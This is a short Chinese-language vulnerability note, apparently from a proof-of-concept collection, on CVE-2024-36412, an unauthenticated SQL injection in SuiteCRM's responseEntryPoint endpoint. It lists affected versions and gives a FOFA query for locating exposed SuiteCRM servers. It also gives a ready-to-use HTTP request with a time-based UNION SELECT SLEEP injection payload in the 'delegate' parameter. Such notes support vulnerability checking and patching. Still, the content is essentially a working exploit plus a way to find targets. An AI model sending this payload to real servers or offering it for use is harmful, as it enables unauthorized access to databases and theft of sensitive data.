## SuiteCRM系统接口responseEntryPoint存在SQL注入漏洞(CVE-2024-36412)

SuiteCRM存在SQL注入漏洞，未经身份验证的远程攻击者可以通过该漏洞拼接执行SQL注入语句，从而获取数据库敏感信息。

## 影响范围:

```
SuiteCRM < 7.14.4
SuiteCRM < 8.6.1
```

## fofa

```yaml
title="SuiteCRM"
```

## poc

```yaml
GET /index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(5);--+-&type=c&response=accept HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

![image-20240716202647446](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407162026514.png)